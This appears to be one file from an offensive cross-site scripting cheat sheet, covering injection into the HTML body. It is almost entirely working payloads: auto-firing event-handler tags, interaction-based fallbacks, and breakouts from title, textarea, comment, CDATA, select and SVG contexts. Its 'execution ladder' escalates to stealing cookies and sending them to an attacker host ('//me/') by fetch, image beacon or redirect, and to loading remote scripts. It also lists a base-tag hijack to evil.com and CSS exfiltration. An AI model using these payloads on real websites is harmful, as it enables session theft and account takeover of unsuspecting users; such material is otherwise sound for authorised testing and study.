# HTML body context — injection lands between tags

The reflected/stored value lands as markup between existing tags:

```html
<div>Welcome, USER_INPUT</div>
<p>Result: USER_INPUT</p>
<li>USER_INPUT</li>
```

This is the friendliest context — full tag space is available.
Confirm with a benign tag first, then pick the payload family by
what the response shows was eaten.

---

## 1. The confirmation sequence

```text
1. <b>XSS_PROBE_x</b>            → survives verbatim? markup context confirmed
2. <img src=x onerror="XSS_PROBE_x"> → handler fires? JS-execution confirmed
3. <svg onload="XSS_PROBE_x">    → second channel, no src needed
```

If `<b>` survives but `<img onerror>` is stripped → a filter eats
`on*` or `<img` — pull `filter-bypass.md`. If `<b>` lands as text
(`&lt;b&gt;`) → the context is entity-encoded or you're actually in
an attribute (check the raw response, not the rendered page).

---

## 2. The firing-tag inventory — no-user-interaction

These fire on render, no click/hover needed:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus><option></select>
<textarea onfocus=alert(1) autofocus></textarea>
<keygen onfocus=alert(1) autofocus>          -- Chrome-legacy
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>x</marquee>
<video><source onerror=alert(1)></video>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<audio src=x onerror=alert(1) controls>
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="javascript:alert(1)">
<embed src="data:text/html,<script>alert(1)</script>">
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe srcdoc="<script>alert(1)</script>">
<iframe srcdoc="<img src=x onerror=alert(1)>">
<math><mtext><mglyph><style><img src=x onerror=alert(1)>
<meter onmouseover=alert(1)>x</meter>        -- needs hover
<dialog open onclose=alert(1)>x</dialog>
<noscript><p title="</noscript><img src=x onerror=alert(1)>"> -- mXSS
```

`<script>` inside innerHTML never runs — but in a server-rendered
context (the response IS the page) it runs fine. The distinction:
server-side injection → all tags work; DOM sink → check `dom-xss.md`.

---

## 3. Interaction-required tags — when autofire fails

```html
<a href="javascript:alert(1)">click</a>
<div onmouseover=alert(1)>hover me</div>
<span onmouseover=alert(1)>x</span>
<x onmouseover=alert(1)>x</x>                -- unknown tag, still fires
<a onmousemove=alert(1)>x</a>
<form><input type=submit formaction="javascript:alert(1)" value=x></form>
<button formaction="javascript:alert(1)">x</button>
<a href="data:text/html,<script>alert(1)</script>">x</a>
```

For admin-bot targets, interaction is unreliable — bots don't
hover. Prefer autofire; keep these as fallback when every autofire
is filtered.

---

## 4. The payload-execution ladder — what's inside the handler

```html
<img src=x onerror="alert(1)">                          -- proof
<img src=x onerror="alert(document.domain)">             -- context proof
<img src=x onerror="alert(document.cookie)">             -- session proof
<img src=x onerror="fetch('//me/?c='+document.cookie)">  -- exfil
<img src=x onerror="new Image().src='//me/?c='+document.cookie">
<img src=x onerror="location='//me/?c='+document.cookie">
<img src=x onerror="eval(name)">                         -- window.name carrier
<img src=x onerror="eval(location.hash.slice(1))">       -- hash carrier
<img src=x onerror="import('//me/x.js')">                -- module import
<img src=x onerror="s=document.createElement('script');s.src='//me/x.js';document.body.append(s)">
```

---

## 5. The attribute-breakout — value lands inside a tag's attribute

If the injection point is INSIDE an attribute value, you need a
quote to escape — see `attribute-context.md`. Signs you're in an
attribute: the raw response shows `value="USER_INPUT"` or
`title='USER_INPUT'`.

---

## 6. Inside existing tags — `<title>`, `<textarea>`, `<style>`

```html
<title>USER_INPUT</title>
  → </title><img src=x onerror=alert(1)>
  → the title is outside body — escape then inject

<textarea>USER_INPUT</textarea>
  → </textarea><img src=x onerror=alert(1)>
  → textarea content is RCDATA — tags don't parse inside

<style>USER_INPUT</style>
  → </style><img src=x onerror=alert(1)>
  → or CSS-expression IE: x:expression(alert(1)) — dead but try
  → or CSS exfil: *{background:url(//me/?c=...)} — no JS

<xmp>USER_INPUT</xmp>
  → </xmp><img src=x onerror=alert(1)>    -- raw-text element
<noembed>, <noframes>, <noscript>, <plaintext>
  → same escape pattern — close then inject
  → <plaintext> swallows the rest of the page — everything after
    it is text; inject BEFORE the plaintext tag closes or escape it
```

---

## 7. Inside comments and CDATA

```html
<!-- comment USER_INPUT -->
  → --><img src=x onerror=alert(1)><!--
  → --> escapes the comment; the trailing <!-- re-opens one
  → parser tolerates unterminated trailing comments

<![CDATA[USER_INPUT]]>
  → ]]><img src=x onerror=alert(1)>       -- close CDATA then tag
```

---

## 8. The `select`/`option`/`optgroup` confinement

Inside `<select>` only option-family tags parse — everything else
is dropped:

```html
<select><option>USER_INPUT</option></select>
  → </select><img src=x onerror=alert(1)>
  → </option></select><svg onload=alert(1)>
```

Same confinement: `<table>` (only tr/td/th/caption parse inside),
`<ul>/<ol>` (only li), `<dl>` (only dt/dd). The universal escape:
close the confining element chain.

---

## 9. SVG/MathML foreign-content context

Inside `<svg>` or `<math>` the parser switches to foreign-content
rules — different tag names, different attr casing, CDATA allowed:

```html
<svg><desc>USER_INPUT</desc></svg>
  → </desc><script>alert(1)</script>      -- script works inside svg
  → </desc><image href=x onerror=alert(1)>
  → </desc><foreignObject><img src=x onerror=alert(1)></foreignObject>
  → inside foreignObject the parser is back to HTML rules
```

---

## 10. Meta-refresh and base-tag contexts

```html
<meta http-equiv="refresh" content="0;url=USER_INPUT">
  → javascript:alert(1)                   -- refresh to js: scheme
  → data:text/html,<script>alert(1)</script>

<base href="USER_INPUT">
  → javascript:alert(1)//                  -- base-hijack (rare)
  → //evil.com/                            -- relative-URL hijack
```

---

## 11. The insertion-point sanity check

After injecting a probe, verify in the RAW response where it
landed — the DOM inspector lies (it shows the parsed tree, which
normalizes). `curl` the response and grep for `XSS_PROBE_`:

```text
<div>ok <img src=x onerror=alert(1)> tail</div>   → clean insertion
<div>ok <img src=x> tail</div>                    → onerror eaten
<div>ok &lt;img src=x onerror=alert(1)&gt;</div>  → entity-encoded
<div>ok  tail</div>                               → tag eaten entirely
```

Each outcome routes to a different file — `filter-bypass.md`,
`encodings.md`, or `contexts.md` re-route.
